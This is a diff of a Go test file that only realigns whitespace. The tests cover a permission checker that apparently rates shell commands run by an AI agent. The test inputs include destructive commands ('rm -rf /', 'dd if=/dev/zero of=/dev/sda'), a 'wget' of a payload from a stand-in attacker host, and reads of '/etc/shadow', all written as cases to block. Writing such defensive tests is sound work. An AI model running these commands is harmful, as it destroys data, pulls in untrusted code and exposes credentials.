@@ -210,8 +210,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 
 		// dangerous commands → always blocked (level 4)
 		{
-			name:    "rm is always dangerous",
-			input:   map[string]any{"command": "rm -rf /tmp/old"},
+			name:  "rm is always dangerous",
+			input: map[string]any{"command": "rm -rf /tmp/old"},
 			want: &permission.PermissionRequest{
 				Action:      "rm",
 				Content:     "执行危险命令: rm -rf /tmp/old",
@@ -222,8 +222,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "curl is always dangerous",
-			input:   map[string]any{"command": "curl https://example.com"},
+			name:  "curl is always dangerous",
+			input: map[string]any{"command": "curl https://example.com"},
 			want: &permission.PermissionRequest{
 				Action:      "curl",
 				Content:     "执行危险命令: curl https://example.com",
@@ -234,8 +234,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "git is always dangerous",
-			input:   map[string]any{"command": "git push origin main"},
+			name:  "git is always dangerous",
+			input: map[string]any{"command": "git push origin main"},
 			want: &permission.PermissionRequest{
 				Action:      "git",
 				Content:     "执行危险命令: git push origin main",
@@ -246,8 +246,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "dd is always dangerous",
-			input:   map[string]any{"command": "dd if=/dev/zero of=/dev/sda"},
+			name:  "dd is always dangerous",
+			input: map[string]any{"command": "dd if=/dev/zero of=/dev/sda"},
 			want: &permission.PermissionRequest{
 				Action:      "dd",
 				Content:     "执行危险命令: dd if=/dev/zero of=/dev/sda",
@@ -258,8 +258,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "wget is always dangerous",
-			input:   map[string]any{"command": "wget http://evil.com/payload"},
+			name:  "wget is always dangerous",
+			input: map[string]any{"command": "wget http://evil.com/payload"},
 			want: &permission.PermissionRequest{
 				Action:      "wget",
 				Content:     "执行危险命令: wget http://evil.com/payload",
@@ -272,8 +272,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 
 		// compound commands (AST level)
 		{
-			name:    "compound command with &&",
-			input:   map[string]any{"command": "ls && rm file.txt"},
+			name:  "compound command with &&",
+			input: map[string]any{"command": "ls && rm file.txt"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行复合命令: ls && rm file.txt",
@@ -284,8 +284,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "compound command with ||",
-			input:   map[string]any{"command": "mkdir dir || echo exists"},
+			name:  "compound command with ||",
+			input: map[string]any{"command": "mkdir dir || echo exists"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行复合命令: mkdir dir || echo exists",
@@ -296,8 +296,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "pipe command",
-			input:   map[string]any{"command": "cat file.txt | grep pattern"},
+			name:  "pipe command",
+			input: map[string]any{"command": "cat file.txt | grep pattern"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行复合命令: cat file.txt | grep pattern",
@@ -309,8 +309,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 		},
 		// multi-statement: analyzed individually, not blanket-rejected
 		{
-			name:    "semicolon: unknown cmd + safe cmd",
-			input:   map[string]any{"command": "cd /tmp; ls"},
+			name:  "semicolon: unknown cmd + safe cmd",
+			input: map[string]any{"command": "cd /tmp; ls"},
 			want: &permission.PermissionRequest{
 				Action:      "multi",
 				Content:     "执行多命令: 执行未知命令: cd /tmp",
@@ -326,8 +326,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			wantNil: true,
 		},
 		{
-			name:    "semicolon with dangerous cmd",
-			input:   map[string]any{"command": "echo hello; rm -rf /"},
+			name:  "semicolon with dangerous cmd",
+			input: map[string]any{"command": "echo hello; rm -rf /"},
 			want: &permission.PermissionRequest{
 				Action:      "multi",
 				Content:     "执行多命令: 执行危险命令: rm -rf /",
@@ -338,8 +338,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "background command",
-			input:   map[string]any{"command": "sleep 10 &"},
+			name:  "background command",
+			input: map[string]any{"command": "sleep 10 &"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行后台命令: sleep 10 &",
@@ -350,8 +350,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "negated command",
-			input:   map[string]any{"command": "! ls"},
+			name:  "negated command",
+			input: map[string]any{"command": "! ls"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行否定命令: ! ls",
@@ -362,8 +362,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "subshell",
-			input:   map[string]any{"command": "(cd /tmp && ls)"},
+			name:  "subshell",
+			input: map[string]any{"command": "(cd /tmp && ls)"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行子shell: (cd /tmp && ls)",
@@ -374,8 +374,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "block",
-			input:   map[string]any{"command": "{ ls; pwd; }"},
+			name:  "block",
+			input: map[string]any{"command": "{ ls; pwd; }"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行命令块: { ls; pwd; }",
@@ -386,8 +386,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "if clause",
-			input:   map[string]any{"command": "if ls; then echo ok; fi"},
+			name:  "if clause",
+			input: map[string]any{"command": "if ls; then echo ok; fi"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行条件命令: if ls; then echo ok; fi",
@@ -398,8 +398,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "for loop",
-			input:   map[string]any{"command": "for i in 1 2 3; do echo $i; done"},
+			name:  "for loop",
+			input: map[string]any{"command": "for i in 1 2 3; do echo $i; done"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行循环命令: for i in 1 2 3; do echo $i; done",
@@ -410,8 +410,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "while loop",
-			input:   map[string]any{"command": "while true; do sleep 1; done"},
+			name:  "while loop",
+			input: map[string]any{"command": "while true; do sleep 1; done"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行循环命令: while true; do sleep 1; done",
@@ -422,8 +422,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "function declaration",
-			input:   map[string]any{"command": "foo() { echo bar; }"},
+			name:  "function declaration",
+			input: map[string]any{"command": "foo() { echo bar; }"},
 			want: &permission.PermissionRequest{
 				Action:      "compound",
 				Content:     "执行函数声明: foo() { echo bar; }",
@@ -462,8 +462,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 			},
 		},
 		{
-			name:    "grep no path flag only",
-			input:   map[string]any{"command": "grep -r pattern"},
+			name:  "grep no path flag only",
+			input: map[string]any{"command": "grep -r pattern"},
 			want: &permission.PermissionRequest{
 				Action:      "grep",
 				Content:     "执行系统命令: grep -r pattern",
@@ -476,8 +476,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 
 		// unknown commands → level 3
 		{
-			name:    "unknown command defaults to level 3",
-			input:   map[string]any{"command": "some_weird_cmd --flag"},
+			name:  "unknown command defaults to level 3",
+			input: map[string]any{"command": "some_weird_cmd --flag"},
 			want: &permission.PermissionRequest{
 				Action:      "some_weird_cmd",
 				Content:     "执行未知命令: some_weird_cmd --flag",
@@ -496,8 +496,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 		},
 		// rm with long content → truncated
 		{
-			name:    "long dangerous command truncates args summary",
-			input:   map[string]any{"command": "rm " + repeatStr("x", 250)},
+			name:  "long dangerous command truncates args summary",
+			input: map[string]any{"command": "rm " + repeatStr("x", 250)},
 			want: &permission.PermissionRequest{
 				Action:      "rm",
 				Content:     "执行危险命令: rm " + repeatStr("x", 250),
@@ -510,8 +510,8 @@ func TestExecutePerm_NeedPermission(t *testing.T) {
 
 		// parse error → let LLM decide
 		{
-			name:    "unparseable command",
-			input:   map[string]any{"command": "((("},
+			name:  "unparseable command",
+			input: map[string]any{"command": "((("},
 			want: &permission.PermissionRequest{
 				Action:      "unknown",
 				Content:     "执行命令(无法解析): (((",
@@ -634,7 +634,7 @@ func TestAnalyzeCommand_WorkspaceBoundary(t *testing.T) {
 		{"cat README.md", "/workspace", true},
 		{"ls /etc/passwd", "/workspace", false},
 		{"cat /etc/shadow", "/workspace", false},
-		{"ls /workspace/src", "", false},        // no workspace → absolute paths are suspicious
+		{"ls /workspace/src", "", false}, // no workspace → absolute paths are suspicious
 		{"cat /var/log/syslog", "/workspace", false},
 	}
 
@@ -826,7 +826,7 @@ func TestResolvePath(t *testing.T) {
 		{"../escape", "/workspace", "/escape"},
 		{"/absolute", "/workspace", "/absolute"},
 		{"", "/workspace", "/workspace"}, // filepath.Join returns workspace for empty path
-		{"file.txt", "", ""}, // no workspace → can't resolve relative
+		{"file.txt", "", ""},             // no workspace → can't resolve relative
 	}
 
 	for _, tt := range tests {
